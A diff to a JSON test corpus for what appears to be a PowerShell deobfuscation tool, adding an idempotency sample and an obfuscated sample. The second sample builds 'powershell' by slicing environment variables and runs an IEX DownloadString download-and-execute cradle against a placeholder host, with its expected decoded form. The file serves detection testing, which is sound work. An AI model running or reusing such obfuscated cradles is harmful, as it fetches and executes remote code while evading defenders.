@@ -1,6 +1,6 @@
 {
-  "corpus_version": "1.1.0",
-  "purpose": "Workspace Decode Pipeline certification corpus. Starting point for the permanent 60-sample workspace_regression_corpus/ (Phase 7.5). Every sample is deterministic — no time, no randomness, no network. S001 is the owner's permanent regression anchor.",
+  "corpus_version": "1.2.0",
+  "purpose": "Workspace Decode Pipeline certification corpus. Starting point for the permanent 60-sample workspace_regression_corpus/ (Phase 7.5). Every sample is deterministic — no time, no randomness, no network. S001 is the owner's permanent regression anchor. S012 and S013 added at v1.2.0 to exercise semantic reconstruction beyond Base64.",
   "samples": [
     {
       "id": "S001_ps_writehost_tweet",
@@ -119,6 +119,47 @@
         "final_output_contains": ["hello world"],
         "must_not_route_to": "powershell",
         "regression_note": "Historic design flaw: \\bpowershell\\b regex misroutes this to PowerShell. Recovery must not reintroduce this behavior."
+      }
+    },
+    {
+      "id": "S012_plaintext_anchor",
+      "family": "Already-canonical PowerShell (idempotency anchor)",
+      "input": "Write-Host \"tweet, tweet!\"",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": [],
+        "final_output_equals": "Write-Host \"tweet, tweet!\"",
+        "convergence": {
+          "iterations": 1,
+          "structural_changes": 0,
+          "content_changes": 0,
+          "decoder_changes": 0,
+          "semantic_changes": 0,
+          "canonical_state": true
+        },
+        "purpose": "Proves already-canonical PS is not modified · no normalizer replaces valid content · no alias pass overwrites richer output · zero deterministic transforms remain."
+      }
+    },
+    {
+      "id": "S013_env_slice_join_reconstruction",
+      "family": "Environment variable slicing + Join folding + Semantic reconstruction (no decoder transformations)",
+      "input": "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX (New-Object Net.WebClient).DownloadString('http://slicetest.local')\" )",
+      "expected": {
+        "interpreter": "powershell",
+        "decoder_chain": [],
+        "structural_pass_must_resolve": ["join()", "nested-joins", "parentheses", "operator-folding"],
+        "content_pass_must_resolve": ["mixed-case", "env-var-substitution", "array-slicing", "string-joins", "whitespace-normalize"],
+        "decoder_pass_result": "no decoder transformations required",
+        "semantic_pass_must_reconstruct": ["psh", "powershell", "-command", "IEX", "New-Object", "DownloadString(...)"],
+        "final_output_semantically_equivalent_to": "powershell -Command IEX (New-Object Net.WebClient).DownloadString('http://slicetest.local')",
+        "final_output_must_not_be": [
+          "(ps-alias-normalize · no aliases)",
+          "$env:ComSpec[4,15,25]",
+          "[string]::Join(...)",
+          "& (...)"
+        ],
+        "iocs_contains": ["http://slicetest.local"],
+        "purpose": "Verifies the Convergence Engine can perform Structure → Content → Semantic reconstruction → Canonical command without relying on decoder plugins."
       }
     }
   ]
